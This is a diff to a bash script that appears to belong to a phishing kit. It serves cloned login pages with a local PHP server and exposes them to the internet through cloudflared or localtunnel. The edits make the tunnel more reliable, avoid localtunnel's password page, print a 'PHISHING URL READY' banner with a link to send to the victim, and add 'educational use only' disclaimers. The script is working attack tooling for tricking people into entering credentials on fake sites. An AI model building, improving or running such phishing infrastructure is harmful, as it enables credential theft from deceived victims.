@@ -350,86 +350,126 @@ printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
 cd sites/$server && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
 sleep 2
 
+printf "\e[1;93m========================================\e[0m\n"
+printf "\e[1;93m     EDUCATIONAL USE ONLY\e[0m\n"
+printf "\e[1;93m     For Security Research & Testing\e[0m\n"
+printf "\e[1;93m========================================\e[0m\n\n"
+
 # Check for cloudflared first (better than localtunnel - no password!)
 if command -v cloudflared &> /dev/null; then
-    printf "\e[1;92m[\e[0m*\e[1;92m] Starting cloudflared tunnel (no password)...\n"
+    printf "\e[1;92m[*] Starting Cloudflared tunnel...\e[0m\n"
     rm -f /tmp/tunnel.log
     cloudflared tunnel --url http://127.0.0.1:5555 > /tmp/tunnel.log 2>&1 &
     TUNNEL_PID=$!
     
-    printf "\e[1;93m[*] Waiting for cloudflared to start...\e[0m\n"
-    sleep 8
+    printf "\e[1;93m[*] Waiting for tunnel to start (15 seconds)...\e[0m\n"
+    sleep 15
     
-    link=$(grep -o 'https://[a-z0-9-]*\.trycloudflare\.com' /tmp/tunnel.log | head -1)
+    link=$(grep -o 'https://[a-zA-Z0-9-]*\.trycloudflare\.com' /tmp/tunnel.log | head -1)
     
     if [[ -z "$link" ]]; then
-        sleep 3
-        link=$(grep -o 'https://[a-z0-9-]*\.trycloudflare\.com' /tmp/tunnel.log | head -1)
+        sleep 5
+        link=$(grep -o 'https://[a-zA-Z0-9-]*\.trycloudflare\.com' /tmp/tunnel.log | head -1)
     fi
     
     TUNNEL_TYPE="cloudflared"
 else
-    # Fallback to localtunnel with subdomain trick to avoid password
-    printf "\e[1;92m[\e[0m*\e[1;92m] Checking if localtunnel is installed...\n"
+    # Fallback to localtunnel without subdomain (subdomain might fail)
+    printf "\e[1;92m[*] Checking if localtunnel is installed...\e[0m\n"
     if ! command -v lt &> /dev/null; then
         printf "\e[1;91m[!] Localtunnel not found! Installing...\e[0m\n"
         sudo npm install -g localtunnel
+        if [ $? -ne 0 ]; then
+            printf "\e[1;91m[!] Failed to install localtunnel. Try: sudo npm install -g localtunnel\e[0m\n"
+            exit 1
+        fi
     fi
-
-    # Generate random subdomain to avoid password page
-    RANDOM_SUBDOMAIN="blackeye-$(date +%s | tail -c 6)"
     
-    printf "\e[1;92m[\e[0m*\e[1;92m] Starting localtunnel with subdomain...\n"
+    printf "\e[1;92m[*] Starting localtunnel...\e[0m\n"
     rm -f /tmp/lt.log
-    lt --port 5555 --subdomain $RANDOM_SUBDOMAIN > /tmp/lt.log 2>&1 &
+    
+    # Start localtunnel and capture output
+    lt --port 5555 > /tmp/lt.log 2>&1 &
     TUNNEL_PID=$!
     
     TUNNEL_TYPE="localtunnel"
+    
+    printf "\e[1;93m[*] Waiting for tunnel to start (12 seconds)...\e[0m\n"
+    sleep 12
 fi
 
-printf "\e[1;93m[*] Waiting for tunnel to start...\e[0m\n"
-sleep 8
-
-# Try multiple times to get the link
+# Try multiple times to get the link with better patterns
 link=""
-for i in {1..5}; do
+printf "\e[1;93m[*] Extracting tunnel URL...\e[0m\n"
+
+for i in {1..8}; do
     if [[ "$TUNNEL_TYPE" == "cloudflared" ]]; then
-        link=$(grep -o 'https://[a-z0-9-]*\.trycloudflare\.com' /tmp/tunnel.log | head -1)
+        link=$(grep -oP 'https://[a-zA-Z0-9-]+\.trycloudflare\.com' /tmp/tunnel.log | head -1)
     else
-        link=$(grep -o 'https://[a-z0-9-]*\.loca\.lt' /tmp/lt.log | head -1)
+        # Try different patterns for localtunnel
+        link=$(grep -oP 'https://[a-z0-9-]+\.loca\.lt' /tmp/lt.log | head -1)
+        if [[ -z "$link" ]]; then
+            link=$(grep -oP 'your url is: \Khttps://[^\s]+' /tmp/lt.log | head -1)
+        fi
+        if [[ -z "$link" ]]; then
+            link=$(cat /tmp/lt.log | grep -oP 'https://[a-z0-9-]+\.loca\.lt' | head -1)
+        fi
     fi
     
     if [[ ! -z "$link" ]]; then
+        printf "\e[1;92m[✓] Tunnel URL found!\e[0m\n"
         break
     fi
-    sleep 2
+    printf "\e[1;93m[*] Attempt $i/8 - waiting...\e[0m\n"
+    sleep 3
 done
 
 if [[ -z "$link" ]]; then
+    printf "\e[1;91m\n========================================\e[0m\n"
     printf "\e[1;91m[!] Failed to get tunnel link!\e[0m\n"
-    printf "\e[1;93m[*] Debug - Tunnel output:\e[0m\n"
+    printf "\e[1;91m========================================\e[0m\n\n"
+    printf "\e[1;93m[*] Debug Information:\e[0m\n"
+    printf "\e[1;93m[*] Tunnel Type: $TUNNEL_TYPE\e[0m\n"
+    printf "\e[1;93m[*] Log file contents:\e[0m\n"
     if [[ "$TUNNEL_TYPE" == "cloudflared" ]]; then
         cat /tmp/tunnel.log
     else
         cat /tmp/lt.log
     fi
-    printf "\e[1;93m[!] Trying to install cloudflared for password-free tunneling...\e[0m\n"
+    printf "\n\e[1;93m[*] Checking if tunnel process is running:\e[0m\n"
+    ps aux | grep -E "cloudflared|lt" | grep -v grep
     
-    # Install cloudflared
+    printf "\n\e[1;92m[*] AUTO-FIX: Installing Cloudflared (no password needed)...\e[0m\n"
+    
     arch=$(uname -m)
     if [[ "$arch" == "x86_64" ]]; then
         wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O /tmp/cloudflared
         sudo mv /tmp/cloudflared /usr/local/bin/cloudflared
         sudo chmod +x /usr/local/bin/cloudflared
-        printf "\e[1;92m[✓] Cloudflared installed! Please run the script again.\e[0m\n"
+        printf "\e[1;92m[✓] Cloudflared installed! Run the script again.\e[0m\n"
+    elif [[ "$arch" == "aarch64" ]] || [[ "$arch" == "arm64" ]]; then
+        wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O /tmp/cloudflared
+        sudo mv /tmp/cloudflared /usr/local/bin/cloudflared
+        sudo chmod +x /usr/local/bin/cloudflared
+        printf "\e[1;92m[✓] Cloudflared installed! Run the script again.\e[0m\n"
     fi
     exit 1
 fi
+printf "\n\e[1;92m========================================\e[0m\n"
+printf "\e[1;92m         PHISHING URL READY\e[0m\n"
+printf "\e[1;92m========================================\e[0m\n"
+printf "\e[1;92m[*] Send this link:\e[0m\n"
+printf "\e[1;77m    %s\e[0m\n\n" "$link"
 
-printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" "$link"
 if [[ "$TUNNEL_TYPE" == "cloudflared" ]]; then
-    printf "\e[1;92m[✓] Using Cloudflared - NO PASSWORD PAGE!\e[0m\n"
+    printf "\e[1;92m[✓] Cloudflared - NO PASSWORD PAGE!\e[0m\n"
+else
+    printf "\e[1;93m[!] Using Localtunnel - May show password\e[0m\n"
+    printf "\e[1;93m[!] Install cloudflared for better results\e[0m\n"
 fi
+
+printf "\e[1;93m\n[!] REMINDER: Educational & Authorized Testing ONLY\e[0m\n"
+printf "\e[1;93m[!] Obtain proper consent before testing\e[0m\n\n"
 
 # Try to create shortened link
 if [[ ! -z "$link" ]]; then
